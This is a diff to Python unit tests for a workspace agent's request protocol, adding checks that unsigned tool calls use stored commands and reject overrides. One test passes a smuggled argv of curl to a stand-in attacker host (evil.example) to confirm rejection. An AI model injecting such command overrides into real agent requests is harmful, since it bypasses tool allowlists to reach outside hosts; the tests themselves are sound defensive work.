@@ -185,7 +185,7 @@ class WorkspaceAgentProtocolTests(unittest.TestCase):
         self.assertFalse(body["ok"])
         self.assertIn("not allowlisted", body.get("error") or body.get("stderr") or "")
 
-    def test_unsigned_request_rejected(self):
+    def test_unsigned_request_rejected_before_provision(self):
         req = {
             "job_id": self.job_id,
             "action": "tool",
@@ -196,7 +196,46 @@ class WorkspaceAgentProtocolTests(unittest.TestCase):
         self.agent.handle_request(req)
         body = json.loads((self.fleet / "result-unsigned.json").read_text(encoding="utf-8"))
         self.assertFalse(body["ok"])
-        self.assertIn("hmac", (body.get("error") or "").lower())
+        err = (body.get("error") or "").lower()
+        self.assertTrue("hmac" in err or "before provision" in err, body)
+
+    def test_unsigned_tool_after_register_uses_memory_argv(self):
+        self.agent.TOOLS_BY_JOB[self.job_id] = {
+            "echo_ok": {"argv": ["echo", "from-memory"], "description": ""}
+        }
+        (self.cwd / ".fleet-tools.json").write_text(
+            json.dumps({"echo_ok": {"argv": ["echo", "from-file"]}}),
+            encoding="utf-8",
+        )
+        req = {
+            "job_id": self.job_id,
+            "action": "tool",
+            "req_id": "unsigned-ok",
+            "tool": "echo_ok",
+            "cwd": str(self.cwd),
+        }
+        self.agent.handle_request(req)
+        body = json.loads((self.fleet / "result-unsigned-ok.json").read_text(encoding="utf-8"))
+        self.assertTrue(body["ok"], body)
+        self.assertIn("from-memory", body["stdout"])
+        self.assertNotIn("from-file", body["stdout"])
+
+    def test_unsigned_tool_rejects_argv_override(self):
+        self.agent.TOOLS_BY_JOB[self.job_id] = {
+            "echo_ok": {"argv": ["echo", "safe"], "description": ""}
+        }
+        req = {
+            "job_id": self.job_id,
+            "action": "tool",
+            "req_id": "unsigned-argv",
+            "tool": "echo_ok",
+            "cwd": str(self.cwd),
+            "argv": ["curl", "http://evil.example"],
+        }
+        self.agent.handle_request(req)
+        body = json.loads((self.fleet / "result-unsigned-argv.json").read_text(encoding="utf-8"))
+        self.assertFalse(body["ok"], body)
+        self.assertIn("argv", (body.get("error") or "").lower())
 
     def test_git_ref_rejects_shell_metachar(self):
         with self.assertRaises(ValueError):
